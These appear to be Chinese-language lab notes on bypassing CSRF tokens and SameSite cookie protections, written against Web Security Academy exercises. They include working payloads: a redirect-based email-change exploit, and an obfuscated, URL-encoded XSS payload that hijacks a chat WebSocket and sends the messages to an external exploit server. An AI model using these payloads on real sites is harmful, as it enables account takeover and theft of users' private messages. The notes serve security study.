# 令牌验证取决于请求方法的 CSRF
有的时候，csrftoken只针对post请求，我们把请求变成get，并且把无法确认实际值的参数（csrftoken）删掉，然后构造csrf poc，从而绕过csrf token


# 令牌验证取决于令牌存在的 CSRF
直接删掉csrftoken就可以，但是修改令牌值不行
，也就是不传csrftoken就能绕过

# 令牌未绑定到用户会话的 CSRF
这里主要是使用自己的csrftoken（在还没发给服务端的情况下）来修改别人的请求

# 令牌与非会话 Cookie 绑定的 CSRF（没成功）
cookie中的csrfkey与csrftoken绑定，但是csrf可以不属于会话cookie，于是我可以使用我的csrfkey和我的csrftoken去对别人进行csrf攻击，这里我们发现搜索功能会把用户输入字段插入到cookie里面
Set-Cookie: LastSearchTerm=xxx; Secure; HttpOnly
我们使用crlf攻击，设置受害者的csrfkey（setcookie响应中有两个的话后代替前，没有字段的话会合体）

# 令牌在 cookie 中重复的 CSRF
用上面的方法同时提交自己的csrftoken就行，在cookie中

# 绕过samesite=lax
`GET /my-account/change-email?email=test5%40qq.com&_method=POST HTTP/2`

# 通过客户端重定向绕过 SameSite Strict
```
通过分析外部重定向js构造payload
https://0a4c002c0334df45805067e200e50046.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test1%40qq.com%26submit=1
```
请注意，您需要包含 submit 参数和 URL 编码 & 分隔符，以避免在初始设置请求中中断 postId 参数。如果直接在 URL 中使用 & 分隔符，可能会导致解析错误，认为 postId 的值结束了，后面的内容被误认为是新的参数。
最终payload
```
<html>
<script>document.location="https://0a4c002c0334df45805067e200e50046.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test1%40qq.com%26submit=1"
;</script>
</html>
```

# SameSite 通过同级域严格绕过(csrf+xss+cswsh)
思路，发现websocket没有csrftoken，分析建立websocket的js，可劫持，由于semesite=strict，寻找xss（从响应头发现个url）
最终payload
```
<script>
document.location="https://cms-0a1c00870337a02e81195c01008f00dd.web-security-academy.net/login?username=xxxxxx%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%31%63%30%30%38%37%30%33%33%37%61%30%32%65%38%31%31%39%35%63%30%31%30%30%38%66%30%30%64%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20%20%20%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%35%35%30%30%31%31%30%33%66%38%61%30%62%61%38%31%32%30%35%62%32%31%30%31%31%33%30%30%66%35%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%3f%6d%73%67%3d%22%2b%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=";
</script>
```